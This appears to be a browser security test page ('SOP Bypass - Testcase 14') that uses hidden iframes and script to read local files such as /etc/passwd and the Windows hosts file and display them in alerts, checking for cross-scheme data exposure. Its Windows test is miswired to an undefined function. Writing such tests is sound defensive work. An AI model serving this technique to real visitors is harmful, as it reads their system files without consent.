<html>
<head>
    <title>Universal XSS (UXSS) SOP Bypass Vulnerability test</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>


<iframe src="file:///etc/passwd" name="myIframe" width="0px" height="0px"></iframe>
<iframe src="file:///C:/Windows/System32/drivers/etc/hosts" name="myIframe2" width="0px" height="0px"></iframe>

<script>

    function myfunc() {
        var myIframe = frames.myIframe;
        var fenster = window.frames[0];
        var message = fenster.document.getElementsByTagName("pre")[0].childNodes[0].nodeValue;
        var messages = message;
        messages = messages.replace(/#/g, "");
        alert(messages);
        alert(window.frames['myIframe'].document.getElementsByTagName('pre')[0].innerHTML);
    }

    function myfunc2() {

        var myIframe = frames.myIframe2;
        var fenster = window.frames[0];
        var message = fenster.document.getElementsByTagName("pre")[0].childNodes[0].nodeValue;
        var messages = message;
        messages = messages.replace(/#/g, "");
        alert(messages);
        alert(window.frames['myIframe'].document.getElementsByTagName('pre')[0].innerHTML);
    }

</script>

<div class="wrapper">
    <img src="http://www.pngmart.com/files/4/Android-PNG-Image.png" style="width: 100px">

    <h3 class="line">SOP Bypass - Testcase 14</h3>

    <div class="main">
        <p>Testcase for Cross Scheme Data Exposure</p>
    </div>

    <div class="container">
        <input type="button" id="btn_test1" class="test" value="Run Test Case 1 (Linux OS)" onclick="myfunc()"/>
        <br><br>
        <input type="button" id="btn_test2" class="test" value="Run Test Case 2 (Windows OS)" onclick="myfuncwin()"/>
    </div>

    <div class="note">

        <p><strong>Note:</strong> <br/>
            If page displays an alert box displaying the content of /etc/passwd file, it results in a Cross Scheme Data
            Exposure
        </p>
    </div>
</div>

</body>
</html>